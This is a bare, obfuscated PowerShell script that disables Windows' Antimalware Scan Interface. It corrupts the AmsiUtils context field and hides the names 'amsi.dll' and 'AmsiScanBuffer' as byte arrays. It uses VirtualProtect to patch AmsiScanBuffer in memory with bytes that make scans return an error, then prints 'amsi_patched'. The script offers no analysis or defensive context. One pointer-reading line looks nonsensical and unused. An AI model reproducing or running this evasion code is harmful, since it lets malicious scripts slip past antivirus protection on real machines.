$ErrorActionPreference='SilentlyContinue'
[Ref].Assembly.GetTypes()|?{$_.Name -like '*iutils'}|%{
    $f=$_.GetFields('NonPublic,Static')|?{$_.Name -like '*ontext'}
    if($f){[IntPtr]$p=$f.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($p,0x41414141)}
}
# Also patch via AmsiScanBuffer
$k=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    [Runtime.InteropServices.Marshal]::ReadIntPtr(
        [Runtime.InteropServices.Marshal]::ReadIntPtr(
            [Runtime.InteropServices.Marshal]::ReadIntPtr([Char]97.GetType().Assembly.Handle)
        )
    ),[Type][Runtime.InteropServices.Marshal]
)
try{
    $w=Add-Type -MemberDefinition '
    [DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);
    [DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);' -Name W -PassThru
    $h=$w::LoadLibrary([Text.Encoding]::UTF8.GetString([byte[]](97,109,115,105,46,100,108,108)))
    $p=$w::GetProcAddress($h,[Text.Encoding]::UTF8.GetString([byte[]](65,109,115,105,83,99,97,110,66,117,102,102,101,114)))
    $o=[uint32]0
    $w::VirtualProtect($p,[UIntPtr]5,0x40,[ref]$o)
    [Byte[]]$b=0xB8,0x57,0x00,0x07,0x80,0xC3
    [Runtime.InteropServices.Marshal]::Copy($b,0,$p,6)
}catch{}
Write-Output "amsi_patched"